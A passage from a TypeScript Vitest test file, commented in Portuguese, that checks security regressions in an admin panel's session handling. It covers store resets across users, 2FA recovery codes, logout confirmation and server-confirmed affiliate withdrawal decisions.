// Regressões de segurança do painel (src/): regras da sessão no navegador e exportação CSV.
//
// O código do painel roda aqui no Node: o store real (src/lib/store.ts, modo API), o cliente
// real (src/lib/api.ts) e as regras de src/domain/auth-state.ts (as mesmas que o
// ApiSessionProvider usa) falam com o servidor de teste por um fetch que encaminha para
// app.inject e guarda o cookie de sessão como o navegador (um cookie para todas as abas).
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import type { FastifyInstance } from 'fastify'
import type { MeResponse, TwoFactorEnableResponse, TwoFactorSetupResponse } from '@shared/api'
import {
  FOCUS_RECHECK_MS,
  IDLE_MARGIN_MS,
  LOGIN_NOTICES,
  PENDING_LOGOUT_MESSAGE,
  endReasonOf,
  focusRecheckDue,
  idleExpired,
  isLogoutPending,
  logoutFailureText,
  mustResetStore,
  readAccessFor,
  requestLogout,
  resolveSession,
  transition,
  type AuthStatus,
  type FlagStorage,
  type SessionIo,
  type StoreResetOptions,
} from '@/domain/auth-state'
import { csvCell as panelCsvCell, toCsv } from '@/lib/csv-format'
import { seedAffiliateWithdrawals } from '@/data/afiliados'
import { seedSportsbookCredentials } from '@/data/catalog'
import { seedAffiliates } from '@/data/players'
import { seedSportsBets } from '@/data/sports'
import { findKvRule } from '@shared/kv-registry'
import { SECURITY } from '../src/config'
import { totpCode } from '../src/lib/totp'
import { csvCell as serverCsvCell } from '../src/modules/audit/format'
import { encryptAtRest, loadRow, saveRow, storedValue } from '../src/modules/kv/store'
import { api as call, createTestApp, createUser, sessionCookie } from './helpers'

// Importados em tempo de execução (especificador em variável): o tsc do servidor não tem os
// tipos do navegador (DOM, import.meta.env) que estes arquivos usam.
interface StoreModule {
  dbGet<T>(key: string, seed: T | (() => T)): T
  prefetchKeys(keys: string[]): void
  refreshKey(key: string): Promise<void>
  dbSet<T>(key: string, next: T, seed?: T): void
  dbSetAndWait<T>(key: string, next: T | ((prev: T) => T), seed?: T): Promise<boolean>
  isLoadFailed(key: string): boolean
  resetDb(opts?: { notify?: boolean; serverDataOnly?: boolean }): void
  setReadPermissions(perms: ReadonlySet<string> | 'sem-sessao' | null): void
}
interface ApiModule {
  api<T>(method: 'GET' | 'POST' | 'PUT' | 'DELETE', path: string, body?: unknown): Promise<T>
  isApiMode(): boolean
}
const STORE_MODULE = '@/lib/store'
const API_MODULE = '@/lib/api'
const AFILIADOS_MODULE = '@/domain/afiliados'

let app: FastifyInstance
let store: StoreModule
let client: ApiModule

/** cookie de sessão do "navegador" (o mesmo para todas as abas) */
let jar: string | null = null
/** simula falha de rede em pedidos escolhidos (ex.: só o POST /api/auth/logout) */
let dropRequest: ((method: string, url: string) => boolean) | null = null
/** simula resposta de erro do servidor/proxy (ex.: 503 numa leitura) em pedidos escolhidos */
let failRequest: ((method: string, url: string) => number | null) | null = null
/** pedidos que o "navegador" enviou (método e caminho) */
const sent: string[] = []
/** corpos dos PUT que o "navegador" enviou (caminho e corpo JSON) */
const puts: { url: string; body: unknown }[] = []

async function browserFetch(input: string | URL | Request, init: RequestInit = {}): Promise<Response> {
  const url = String(input)
  const method = (init.method ?? 'GET').toUpperCase() as 'GET' | 'POST' | 'PUT' | 'DELETE'
  sent.push(`${method} ${url}`)
  if (method === 'PUT' && typeof init.body === 'string') puts.push({ url, body: JSON.parse(init.body) as unknown })
  if (dropRequest?.(method, url)) throw new TypeError('Failed to fetch')
  const forced = failRequest?.(method, url)
  if (forced) {
    return new Response(JSON.stringify({ error: { code: 'indisponivel', message: `Serviço indisponível (${forced}).` } }), {
      status: forced,
      headers: { 'content-type': 'application/json' },
    })
  }
  const res = await app.inject({
    method,
    url,
    remoteAddress: '127.0.0.1',
    headers: { ...((init.headers as Record<string, string> | undefined) ?? {}), ...(jar ? { cookie: jar } : {}) },
    payload: typeof init.body === 'string' ? init.body : undefined,
  })
  // Set-Cookie (login, logout) atualiza o cookie como o navegador faria
  const set = res.cookies.find((c) => c.name === SECURITY.sessionCookie)
  if (set) jar = set.value ? `${set.name}=${set.value}` : null
  return new Response(res.statusCode === 204 ? null : res.body, {
    status: res.statusCode,
    headers: { 'content-type': String(res.headers['content-type'] ?? 'application/json') },
  })
}

class MemoryStorage implements FlagStorage {
  private data = new Map<string, string>()
  getItem(k: string) {
    return this.data.get(k) ?? null
  }
  setItem(k: string, v: string) {
    this.data.set(k, v)
  }
  removeItem(k: string) {
    this.data.delete(k)
  }
}

/**
 * Uma aba do painel: o estado da sessão e a mesma sequência do ApiSessionProvider (resolveSession → transition).
 * `mounted`: chaves lidas pelas telas abertas; como no useSyncExternalStore, um aviso do store faz a tela reler.
 */
function openTab(keys: string[], storage: FlagStorage | null = null, mounted: string[] = []) {
  const io: SessionIo = {
    getMe: () => client.api<MeResponse>('GET', '/api/auth/me'),
    postLogout: () => client.api<void>('POST', '/api/auth/logout'),
    storage,
  }
  const tab = {
    status: { kind: 'loading' } as AuthStatus,
    io,
    async reload() {
      const r = await resolveSession(() => tab.status, io)
      const resetStore = (o: StoreResetOptions) => {
        store.resetDb(o)
        if (o.notify) for (const k of mounted) store.dbGet(k, [])
      }
      tab.status = transition(tab.status, r.next, keys, { resetStore, prefetch: store.prefetchKeys })
      return { ...r, status: tab.status }
    },
  }
  return tab
}

/** Primeira leitura de uma chave como a tela faz (sem nada em memória): busca e espera o servidor. */
async function loadFresh<T>(key: string, seed: T | (() => T)): Promise<T> {
  store.dbGet(key, seed)
  await store.refreshKey(key) // chave ainda não materializada: só espera a leitura em andamento
  return store.dbGet(key, seed)
}

beforeAll(async () => {
  app = await createTestApp()
  // modo API do painel; DEV desligado (o store só usa `window` para uma lista de chaves de depuração)
  vi.stubEnv('VITE_API_MODE', '1')
  vi.stubEnv('DEV', false)
  vi.stubGlobal('fetch', browserFetch)
  client = (await import(/* @vite-ignore */ API_MODULE)) as ApiModule
  store = (await import(/* @vite-ignore */ STORE_MODULE)) as StoreModule
  expect(client.isApiMode()).toBe(true)
})

afterAll(async () => {
  vi.unstubAllGlobals()
  vi.unstubAllEnvs()
  await app.close()
})

beforeEach(() => {
  jar = null
  dropRequest = null
  failRequest = null
  sent.length = 0
  puts.length = 0
  store.resetDb()
})

// ---------------------------------------------------------------------------
// r1: o cache do store sobrevivia a uma troca de pessoa que passa por uma etapa do login
// ---------------------------------------------------------------------------

function me(id: string, stage: MeResponse['stage'], permissions?: string[], roleId = 'superadmin'): MeResponse {
  return {
    stage,
    user: { id, name: id, email: `${id}@x.com`, roleId, twoFactor: false, lastAccess: null } as unknown as MeResponse['user'],
    ...(permissions ? { permissions, role: { id: roleId } as MeResponse['role'] } : {}),
  }
}

describe('sessão do painel: memória (store) por pessoa e por sessão', () => {
  it('superadmin → etapa 2FA de outra pessoa → painel dela: nada lido por A sobra em memória para B', async () => {
    const a = await createUser(app, { roleId: 'superadmin', name: 'Pessoa A' })
    const b = await createUser(app, { roleId: 'financeiro', name: 'Pessoa B', totp: true })
    const keys = ['auditoria.registros', 'equipe.membros']
    // a aba de A está com a Auditoria e a Equipe abertas
    const tab = openTab(keys, null, keys)

    // A entra e abre a auditoria e a equipe (o store guarda o que o servidor mostra para A)
    jar = await sessionCookie(app, a.id, 'active')
    expect((await tab.reload()).status.kind).toBe('active')
    // evento que o painel pode relatar (o servidor recusa entidades desconhecidas e ações que só ele registra)
    await client.api('POST', '/api/audit/events', { action: 'exportar', entity: 'Saques de afiliados', summary: 'registro que só A pode ver' })
    const auditA = await loadFresh<unknown[]>('auditoria.registros', [])
    expect(JSON.stringify(auditA)).toContain('registro que só A pode ver')
    expect((await loadFresh<unknown[]>('equipe.membros', [])).length).toBeGreaterThanOrEqual(2)

    // em outra aba (mesmo cookie), B digita a senha e chega ao 2FA; a aba de A confere /me ao ganhar foco
    jar = await sessionCookie(app, b.id, '2fa')
    const step = await tab.reload()
    expect(step.status).toMatchObject({ kind: 'step', me: { stage: '2fa', user: { id: b.id } } })
    // uma leitura perdida durante a etapa (o servidor responde 403 etapa_pendente) não pode valer para a sessão de B
    expect(store.dbGet<unknown[]>('equipe.membros', [])).toEqual([])
    await store.refreshKey('equipe.membros')

    // B digita o código nesta aba e a sessão fica ativa
    await client.api('POST', '/api/auth/2fa/verify', { code: totpCode(b.totpSecret!, Date.now()) })
    expect((await tab.reload()).status).toMatchObject({ kind: 'active', me: { user: { id: b.id } } })

    // a tela lê da memória (useDb não busca de novo o que já está lá): nada de A pode estar lá
    expect(JSON.stringify(store.dbGet<unknown[]>('auditoria.registros', []))).not.toContain('registro que só A pode ver')
    // depois da leitura com a sessão de B, vale o que o servidor mostra para B
    expect((await call(app, 'GET', '/api/kv/auditoria.registros', { cookie: jar! })).statusCode).toBe(403)
    expect(await loadFresh<unknown[]>('auditoria.registros', [])).toEqual([])
    const teamForB = await call(app, 'GET', '/api/kv/equipe.membros', { cookie: jar! })
    const expectedTeam = teamForB.statusCode === 200 ? teamForB.json().value : []
    expect(await loadFresh<unknown[]>('equipe.membros', [])).toEqual(expectedTeam)
  })

  it('decide pela identidade, em qualquer etapa', () => {
    const full = ['equipe.ver', 'auditoria.ver']
    const activeA = { kind: 'active', me: me('A', 'active', full) } as const
    expect(mustResetStore(activeA, { kind: 'step', me: me('B', '2fa') })).toBe(true) // outra pessoa numa etapa
    expect(mustResetStore(activeA, { kind: 'active', me: me('B', 'active', full) })).toBe(true) // outra pessoa
    expect(mustResetStore(activeA, { kind: 'step', me: me('A', '2fa') })).toBe(true) // re-login: sessão nova
    expect(mustResetStore(activeA, { kind: 'login', reason: 'logout' })).toBe(true)
    expect(mustResetStore({ kind: 'step', me: me('A', '2fa') }, { kind: 'login', reason: 'expired' })).toBe(true)
    expect(mustResetStore(activeA, { kind: 'active', me: me('A', 'active', ['equipe.ver']) })).toBe(true) // perdeu permissão
    expect(mustResetStore(activeA, { kind: 'active', me: me('A', 'active', full, 'financeiro') })).toBe(true) // outro cargo
    // mesma pessoa, mesmas permissões (em outra ordem): mantém
    expect(mustResetStore(activeA, { kind: 'active', me: me('A', 'active', [...full].reverse()) })).toBe(false)
    // etapa → painel da mesma pessoa, e a abertura do painel: nada a apagar (preferências locais ficam)
    expect(mustResetStore({ kind: 'step', me: me('A', '2fa') }, activeA)).toBe(false)
    expect(mustResetStore({ kind: 'loading' }, activeA)).toBe(false)
  })

  it('apaga a memória antes do prefetch (nada da sessão anterior serve de cache para a nova)', () => {
    const calls: string[] = []
    const fx = {
      resetStore: (o: StoreResetOptions) => calls.push(o.serverDataOnly ? 'reset(servidor)' : o.notify ? 'reset+notify' : 'reset'),
      prefetch: (k: string[]) => calls.push(`prefetch:${k.join(',')}`),
    }
    const next = transition(
      { kind: 'active', me: me('A', 'active', ['auditoria.ver', 'saques.ver']) },
      { kind: 'active', me: me('B', 'active', ['saques.ver']) },
      ['operacao.saques', 'auditoria.registros'],
      fx,
    )
    expect(next.kind).toBe('active')
    // apaga primeiro (as telas continuam montadas e releem com a sessão nova); depois busca só o que o cargo novo pode ler
    expect(calls).toEqual(['reset+notify', 'prefetch:operacao.saques'])

    // indo para uma etapa do login ou para a entrada: apaga sem avisar as telas que vão sair
    // (relendo agora, buscariam com a sessão de transição e guardariam 403/401 para a próxima sessão)
    calls.length = 0
    transition({ kind: 'active', me: me('A', 'active', ['saques.ver']) }, { kind: 'step', me: me('B', '2fa') }, ['operacao.saques'], fx)
    transition({ kind: 'active', me: me('A', 'active', ['saques.ver']) }, { kind: 'login', reason: 'logout' }, ['operacao.saques'], fx)
    expect(calls).toEqual(['reset', 'reset'])

    // toda sessão aberta (depois da entrada, de uma etapa ou ao abrir a página) começa sem dados do servidor
    calls.length = 0
    transition({ kind: 'step', me: me('B', '2fa') }, { kind: 'active', me: me('B', 'active', ['saques.ver']) }, ['operacao.saques'], fx)
    transition({ kind: 'loading' }, { kind: 'active', me: me('B', 'active', ['saques.ver']) }, ['operacao.saques'], fx)
    expect(calls).toEqual(['reset(servidor)', 'prefetch:operacao.saques', 'reset(servidor)', 'prefetch:operacao.saques'])
  })
})

describe('sessão do painel: abrir a sessão mantém as preferências locais', () => {
  it('dados do servidor saem, preferência local (localStorage) fica', async () => {
    const u = await createUser(app, { roleId: 'superadmin' })
    store.dbSet('cassino.jogos.visao', 'grade') // chave local (shared/kv-registry LOCAL_ONLY_PREFIXES)
    jar = await sessionCookie(app, u.id, 'active')
    const tab = openTab(['equipe.membros'])
    expect((await tab.reload()).status.kind).toBe('active')
    expect(store.dbGet('cassino.jogos.visao', 'lista')).toBe('grade')
  })
})

// ---------------------------------------------------------------------------
// r1: códigos de recuperação sumiam com a conferência de /me ao voltar para a aba
// ---------------------------------------------------------------------------

describe('sessão do painel: códigos de recuperação do 2FA', () => {
  it('depois de /2fa/enable o servidor já diz "active", mas nenhuma conferência de fundo troca a tela', async () => {
    const u = await createUser(app, { roleId: 'financeiro', name: 'Pessoa Enroll' })
    jar = await sessionCookie(app, u.id, 'enroll')
    const tab = openTab([])
    expect((await tab.reload()).status).toMatchObject({ kind: 'step', me: { stage: 'enroll' } })
    const loadedAt = Date.now()

    const setup = await client.api<TwoFactorSetupResponse>('POST', '/api/auth/2fa/setup')
    const enabled = await client.api<TwoFactorEnableResponse>('POST', '/api/auth/2fa/enable', { code: totpCode(setup.secret, Date.now()) })
    expect(enabled.recoveryCodes.length).toBeGreaterThan(0)
    // a condição do bug: /me já mudou para 'active' enquanto a tela mostra os códigos
    expect((await client.api<MeResponse>('GET', '/api/auth/me')).stage).toBe('active')

    // a pessoa sai da janela para guardar os códigos e volta mais de 30 s depois
    const back = { status: tab.status, visible: true, busy: false, lastCheck: loadedAt, now: loadedAt + FOCUS_RECHECK_MS + 1_000 }
    expect(focusRecheckDue({ ...back, held: true })).toBe(false) // códigos na tela
    expect(focusRecheckDue({ ...back, held: false })).toBe(false) // etapa do login: nunca confere por baixo
    // só depois de "Continuar para o painel" (releaseRecoveryCodes → reload)
    expect((await tab.reload()).status.kind).toBe('active')
  })

  it('a conferência ao voltar para a aba só vale para a sessão ativa, sem códigos na tela e a cada 30 s desde a última leitura', () => {
    const active: AuthStatus = { kind: 'active', me: me('A', 'active', []) }
    const base = { status: active, visible: true, busy: false, held: false, lastCheck: 0, now: FOCUS_RECHECK_MS }
    expect(focusRecheckDue(base)).toBe(true)
    expect(focusRecheckDue({ ...base, now: FOCUS_RECHECK_MS - 1 })).toBe(false)
    expect(focusRecheckDue({ ...base, held: true })).toBe(false)
    expect(focusRecheckDue({ ...base, busy: true })).toBe(false)
    expect(focusRecheckDue({ ...base, visible: false })).toBe(false)
    expect(focusRecheckDue({ ...base, status: { kind: 'step', me: me('A', '2fa') } })).toBe(false)
    expect(focusRecheckDue({ ...base, status: { kind: 'login' } })).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Rodada de testes ponta a ponta (r1): chaves sem leitura, motivo do fim da sessão e inatividade
// ---------------------------------------------------------------------------

describe('sessão do painel: chave que o cargo não lê nem sai do navegador (sem 403 no console)', () => {
  it('com as permissões da sessão, a leitura de uma chave proibida não vai ao servidor e fica vazia e só leitura', async () => {
    const u = await createUser(app, { roleId: 'marketing', name: 'Pessoa Marketing' })
    jar = await sessionCookie(app, u.id, 'active')
    const perms = (await client.api<MeResponse>('GET', '/api/auth/me')).permissions ?? []
    expect(perms).not.toContain('seguranca-painel.ver')
    store.setReadPermissions(new Set(perms))
    try {
      const v = await loadFresh('config.seguranca-painel', { allowlist: [] as unknown[], enforce2faForAll: false })
      expect(v).toEqual({ allowlist: [], enforce2faForAll: false })
      expect(sent.filter((r) => r.includes('config.seguranca-painel'))).toEqual([])
      // gravar continua recusado antes de enviar (sem PUT)
      expect(await store.dbSetAndWait('config.seguranca-painel', { allowlist: [], enforce2faForAll: true })).toBe(false)
      expect(puts).toEqual([])
      // chave que o cargo lê vai ao servidor normalmente
      await loadFresh('cargos.lista', [])
      expect(sent).toContain('GET /api/kv/cargos.lista')
    } finally {
      store.setReadPermissions(null)
    }
  })

  it('sessão ainda não conhecida (null) não há filtro: a leitura vai ao servidor (que decide)', async () => {
    store.setReadPermissions(null)
    const u = await createUser(app, { roleId: 'superadmin', name: 'Pessoa Sa Filtro' })
    jar = await sessionCookie(app, u.id, 'active')
    await loadFresh('config.seguranca-painel', {})
    expect(sent).toContain('GET /api/kv/config.seguranca-painel')
  })
})

// r2: cada "Sair" disparava GET /api/kv/operacao.saques e cargos.lista com o cookie morto (2 × 401 no console)
describe('sessão do painel: sem sessão ativa nenhuma leitura sai do navegador', () => {
  it('depois da saída (e numa etapa do login) as telas que ainda renderizam leem o vazio, sem pedido ao servidor', async () => {
    const u = await createUser(app, { roleId: 'superadmin', name: 'Pessoa Saida Store' })
    jar = await sessionCookie(app, u.id, 'active')
    const tab = openTab([])
    const opened = await tab.reload()
    expect(opened.status.kind).toBe('active')
    store.setReadPermissions(readAccessFor(opened.status))
    try {
      expect(await requestLogout(tab.io)).toEqual({ ended: true })
      // a mesma regra do ApiSessionProvider.logout → apply({ kind: 'login', reason: 'logout' })
      store.setReadPermissions(readAccessFor({ kind: 'login', reason: 'logout' }))
      sent.length = 0
      // o roteador renderiza o menu e o topo mais uma vez antes de eles saírem
      expect(store.dbGet<unknown[]>('operacao.saques', [])).toEqual([])
      expect(store.dbGet<unknown[]>('cargos.lista', [])).toEqual([])
      await store.refreshKey('operacao.saques')
      await store.refreshKey('cargos.lista')
      expect(sent.filter((r) => r.includes('/api/kv/'))).toEqual([])
    } finally {
      store.setReadPermissions(null)
    }
    expect(readAccessFor({ kind: 'step', me: me('A', '2fa') })).toBe('sem-sessao')
    expect(readAccessFor({ kind: 'offline', message: 'x' })).toBe('sem-sessao')
    expect(readAccessFor({ kind: 'active', me: me('A', 'active', ['saques.ver']) })).toEqual(new Set(['saques.ver']))
  })
})

describe('sessão do painel: a entrada diz por que a sessão terminou', () => {
  it('motivo do servidor (details.reason no 401) vira o aviso da entrada; sem motivo, "expirou"', async () => {
    const u = await createUser(app, { roleId: 'suporte', name: 'Pessoa Motivo Painel' })
    jar = await sessionCookie(app, u.id, 'active')
    const tab = openTab([])
    expect((await tab.reload()).status.kind).toBe('active')
    const admin = await createUser(app, { roleId: 'superadmin', name: 'Admin Motivo Painel' })
    const adminCookie = await sessionCookie(app, admin.id, 'active')
    const r = await call(app, 'POST', `/api/team/${u.id}/deactivate`, { cookie: adminCookie })
    expect(r.statusCode, r.body).toBe(200)
    const after = await tab.reload()
    expect(after.expired).toBe(true)
    expect(after.status).toEqual({ kind: 'login', reason: 'desativado' })
    expect(LOGIN_NOTICES.desativado.title).toBe('Seu acesso foi desativado')

    expect(endReasonOf({ status: 401, details: { reason: 'senha_trocada' } })).toBe('senha_trocada')
    expect(endReasonOf({ status: 401, details: { reason: 'inventado' } })).toBeNull()
    expect(endReasonOf({ status: 401 })).toBeNull()
    // sem motivo do servidor, com a sessão aberta: o aviso genérico
    const io: SessionIo = { getMe: () => Promise.reject(Object.assign(new Error('x'), { status: 401 })), postLogout: async () => {}, storage: null }
    const open = await resolveSession(() => ({ kind: 'active', me: me('Z', 'active', []) }), io)
    expect(open.next).toEqual({ kind: 'login', reason: 'expired' })
  })

  it('inatividade: passou do tempo de Segurança do painel desde a última resposta (com folga) e só com a sessão ativa', () => {
    const m = { ...me('A', 'active', []), sessionTimeoutMinutes: 15 }
    const active: AuthStatus = { kind: 'active', me: m }
    const limit = 15 * 60_000 + IDLE_MARGIN_MS
    expect(idleExpired({ status: active, lastActivity: 0, now: limit })).toBe(false)
    expect(idleExpired({ status: active, lastActivity: 0, now: limit + 1 })).toBe(true)
    expect(idleExpired({ status: { kind: 'step', me: m }, lastActivity: 0, now: limit * 10 })).toBe(false)
    expect(idleExpired({ status: { kind: 'active', me: me('B', 'active', []) }, lastActivity: 0, now: limit * 10 })).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// r1: "Você saiu do painel" com a sessão ainda valendo no servidor
// ---------------------------------------------------------------------------

describe('sessão do painel: sair só com a confirmação do servidor', () => {
  it('logout que não chega ao servidor: não conta como saída, e a próxima abertura do painel tenta sair de novo antes de entrar', async () => {
    const u = await createUser(app, { roleId: 'financeiro', name: 'Pessoa Turno' })
    const storage = new MemoryStorage()
    jar = await sessionCookie(app, u.id, 'active')
    const sessionCookieValue = jar
    const tab = openTab([], storage)
    expect((await tab.reload()).status.kind).toBe('active')

    // só o POST /api/auth/logout falha (rede); a pessoa clica em "Sair"
    dropRequest = (method, url) => method === 'POST' && url === '/api/auth/logout'
    const r = await requestLogout(tab.io)
    expect(r.ended).toBe(false)
    if (!r.ended) expect(logoutFailureText(r.error)).toContain('continua aberta')
    expect(isLogoutPending(storage)).toBe(true)
    // a sessão continua valendo no servidor: a tela não pode dizer que saiu
    expect((await call(app, 'GET', '/api/auth/me', { cookie: sessionCookieValue })).statusCode).toBe(200)

    // a próxima pessoa recarrega a página (o logout ainda falha): o painel não abre com a sessão anterior
    const reopened = openTab([], storage)
    const again = await reopened.reload()
    expect(again.status).toEqual({ kind: 'offline', message: PENDING_LOGOUT_MESSAGE })

    // a rede volta: a abertura conclui a saída antes de confiar em /me
    dropRequest = null
    const done = await reopened.reload()
    expect(done.status).toEqual({ kind: 'login', reason: 'logout' })
    expect(done.loggedOut).toBe(true)
    expect(isLogoutPending(storage)).toBe(false)
    expect((await call(app, 'GET', '/api/auth/me', { cookie: sessionCookieValue })).statusCode).toBe(401)
  })

  it('logout confirmado (204) encerra a sessão e limpa a marca', async () => {
    const u = await createUser(app, { roleId: 'financeiro' })
    const storage = new MemoryStorage()
    jar = await sessionCookie(app, u.id, 'active')
    const cookie = jar
    const tab = openTab([], storage)
    await tab.reload()
    expect(await requestLogout(tab.io)).toEqual({ ended: true })
    expect(isLogoutPending(storage)).toBe(false)
    expect((await call(app, 'GET', '/api/auth/me', { cookie })).statusCode).toBe(401)
  })

  it('só 2xx e 401 contam como saída; 5xx e 403 deixam a sessão aberta', async () => {
    const storage = new MemoryStorage()
    const fail = (status: number, code: string) => () => Promise.reject(Object.assign(new Error(code), { status, code }))
    expect(await requestLogout({ postLogout: fail(401, 'nao_autenticado'), storage })).toEqual({ ended: true })
    expect(isLogoutPending(storage)).toBe(false)
    for (const [status, code] of [
      [500, 'erro_interno'],
      [503, 'indisponivel'],
      [403, 'ip_nao_autorizado'],
      [0, 'sem_conexao'],
    ] as const) {
      const r = await requestLogout({ postLogout: fail(status, code), storage })
      expect(r.ended, `${status} ${code}`).toBe(false)
      expect(isLogoutPending(storage)).toBe(true)
    }
    // a saída não depende da lista de IPs do painel: nenhuma recusa manda "conectar pela rede do escritório"
    for (const error of [{ status: 403, code: 'ip_nao_autorizado' }, { status: 403, code: 'requisicao_invalida' }, { status: 500, code: 'erro_interno' }]) {
      expect(logoutFailureText(error)).toContain('continua aberta')
      expect(logoutFailureText(error)).not.toMatch(/escritório|VPN|IP/)
    }
    expect(logoutFailureText({ status: 0, code: 'sem_conexao' })).toContain('Sem conexão')
  })
})

// ---------------------------------------------------------------------------
// r2: pagar/recusar saque de afiliado mostrava "pago" e auditava 'aprovar' antes do servidor responder;
// com a leitura da lista falhando (5xx/429/rede), o padrão aparecia e um pedido já pago podia ser
// "pago" de novo (outra linha 'aprovar' na auditoria)
// ---------------------------------------------------------------------------

interface DecisionResult {
  ok: boolean
  message: string
}
interface AfiliadosModule {
  payAffiliateWithdrawal(w: unknown, role: unknown, actorName: string): Promise<DecisionResult> | DecisionResult
  rejectAffiliateWithdrawal(w: unknown, role: unknown, actorName: string, reason: string): Promise<DecisionResult> | DecisionResult
}

describe('saques de afiliados: decisão só com a confirmação do servidor', () => {
  type W = { id: string; status: string; amount: number; affiliateId: string; decidedBy: string | null }
  type A = { id: string; balance: number }
  const WKEY = 'afiliados.saques'
  const AKEY = 'crescimento.afiliados'
  /** cargo como o painel o vê (a permissão de decidir; o servidor confere de novo) */
  const role = { id: 'superadmin', name: 'Superadmin', permissions: ['afiliados-saques.aprovar'], approvalCeiling: null }
  let afiliados: AfiliadosModule

  beforeAll(async () => {
    afiliados = (await import(/* @vite-ignore */ AFILIADOS_MODULE)) as AfiliadosModule
  })

  /** grava como a plataforma (a lista é só do servidor) */
  async function platformWrite(key: string, value: unknown) {
    await app.db.tx(async (t) => {
      const row = await loadRow(t, key, true)
      await saveRow(t, app.cipher, key, value, encryptAtRest(findKvRule(key)!), row, 'plataforma')
    })
  }
  async function stored<T>(key: string): Promise<T[]> {
    const row = await loadRow(app.db, key)
    return (row ? storedValue(row, app.cipher) : []) as T[]
  }
  const auditOf = (id: string) =>
    app.db.query<{ action: string; source: string }>(`select action, source from audit_log where entity = $1 order by id`, [`Saque de afiliado #${id}`])
  const pending = () => (seedAffiliateWithdrawals() as unknown as W[]).filter((w) => w.status === 'pendente')

  it('pagar só confirma depois do servidor; com a lista sem carregar (503) nada é pago, gravado nem auditado de novo', async () => {
    const seed = seedAffiliateWithdrawals() as unknown as W[]
    await platformWrite(WKEY, seed)
    const target = pending()[0]
    const op = { ...(await createUser(app, { roleId: 'superadmin', name: 'Operadora Afiliados' })), name: 'Operadora Afiliados' }
    jar = await sessionCookie(app, op.id, 'active')

    // 1) pagar: a resposta vem depois do servidor gravar a lista e auditar (linha do servidor, não do painel)
    const item = (await loadFresh<W[]>(WKEY, seed)).find((w) => w.id === target.id)!
    expect(item.status).toBe('pendente')
    const paid = await afiliados.payAffiliateWithdrawal(item, role, op.name)
    expect(paid.ok).toBe(true)
    expect((await stored<W>(WKEY)).find((w) => w.id === target.id)).toMatchObject({ status: 'pago', decidedBy: 'Operadora Afiliados' })
    expect(store.dbGet<W[]>(WKEY, seed).find((w) => w.id === target.id)?.status).toBe('pago')
    expect(await auditOf(target.id)).toEqual([{ action: 'aprovar', source: 'servidor' }])
    expect(sent.filter((r) => r.startsWith('PUT ') || r === 'POST /api/audit/events')).toEqual([])

    // 2) a página recarrega e GET /api/kv/afiliados.saques dá 503: a lista fica vazia (nunca a demonstração)
    // e só leitura; a linha que a pessoa ainda tinha na tela (pedido "pendente") não decide nada
    store.resetDb()
    failRequest = (method, url) => (method === 'GET' && url === `/api/kv/${WKEY}` ? 503 : null)
    expect(await loadFresh<W[]>(WKEY, seed)).toEqual([])
    expect(store.isLoadFailed(WKEY)).toBe(true)
    const stale = { ...target }
    expect(stale.status).toBe('pendente')
    sent.length = 0
    const again = await afiliados.payAffiliateWithdrawal(stale, role, op.name)
    expect(again.ok).toBe(false)
    expect(again.message).toMatch(/não foram carregados/)
    expect((await afiliados.rejectAffiliateWithdrawal(stale, role, op.name, 'Outro motivo')).ok).toBe(false)
    // nenhuma gravação sobre o padrão, por qualquer caminho (a gravação recusada só tenta ler de novo)
    expect(await store.dbSetAndWait<W[]>(WKEY, (prev) => prev.map((w) => (w.id === stale.id ? { ...w, status: 'pago' } : w)))).toBe(false)
    expect(sent.filter((r) => !r.startsWith('GET '))).toEqual([])
    expect(sent).toContain(`GET /api/kv/${WKEY}`)
    expect(await auditOf(target.id)).toEqual([{ action: 'aprovar', source: 'servidor' }])

    // 3) o servidor volta: "tentar de novo" carrega a lista real e libera a chave
    failRequest = null
    await store.refreshKey(WKEY)
    expect(store.isLoadFailed(WKEY)).toBe(false)
    expect(store.dbGet<W[]>(WKEY, seed).find((w) => w.id === target.id)?.status).toBe('pago')
    // uma linha velha (ainda "pendente") não paga de novo: o servidor confere o status
    const dup = await afiliados.payAffiliateWithdrawal(stale, role, op.name)
    expect(dup.ok).toBe(false)
    expect(dup.message).toMatch(/já foi decidido/)
    expect(await auditOf(target.id)).toEqual([{ action: 'aprovar', source: 'servidor' }])
    await store.refreshKey(WKEY)
  })

  it('recusar devolve o saldo no servidor; erro do servidor na decisão não vira sucesso nem auditoria', async () => {
    const seed = seedAffiliateWithdrawals() as unknown as W[]
    await platformWrite(WKEY, seed)
    await platformWrite(AKEY, seedAffiliates())
    const [, toReject, toFail] = pending()
    const balanceBefore = (await stored<A>(AKEY)).find((a) => a.id === toReject.affiliateId)!.balance
    const op = { ...(await createUser(app, { roleId: 'superadmin', name: 'Operador Recusa' })), name: 'Operador Recusa' }
    jar = await sessionCookie(app, op.id, 'active')
    const list = await loadFresh<W[]>(WKEY, seed)

    const res = await afiliados.rejectAffiliateWithdrawal(list.find((w) => w.id === toReject.id)!, role, op.name, 'Dados do PIX divergentes do titular')
    expect(res.ok).toBe(true)
    expect((await stored<W>(WKEY)).find((w) => w.id === toReject.id)).toMatchObject({ status: 'recusado', decidedBy: 'Operador Recusa' })
    expect((await stored<A>(AKEY)).find((a) => a.id === toReject.affiliateId)!.balance).toBeCloseTo(balanceBefore + toReject.amount, 2)
    expect(await auditOf(toReject.id)).toEqual([{ action: 'recusar', source: 'servidor' }])

    // a decisão não chega ao servidor (503 no POST): a tela não diz que pagou e o pedido continua pendente
    failRequest = (method, url) => (method === 'POST' && url.includes(`/${toFail.id}/`) ? 503 : null)
    const failed = await afiliados.payAffiliateWithdrawal(list.find((w) => w.id === toFail.id)!, role, op.name)
    expect(failed.ok).toBe(false)
    expect(failed.message).toMatch(/não foi salva/)
    expect(store.dbGet<W[]>(WKEY, seed).find((w) => w.id === toFail.id)?.status).toBe('pendente')
    expect((await stored<W>(WKEY)).find((w) => w.id === toFail.id)?.status).toBe('pendente')
    expect(await auditOf(toFail.id)).toEqual([])
    expect(sent.filter((r) => r.startsWith('PUT ') || r === 'POST /api/audit/events')).toEqual([])
  })
})

// ---------------------------------------------------------------------------
// r2 api-mode-seed-fallback: sem nada gravado no servidor, o modo API mostrava (e gravava) os dados
// de demonstração do painel como se fossem do servidor, e a primeira gravação ia sem versão
// ---------------------------------------------------------------------------

describe('modo API: o que o servidor não gravou nunca aparece como dado de demonstração', () => {
  it('stored:false: lista vazia (nunca os registros de demonstração); configuração com o padrão; versão 0 guardada', async () => {
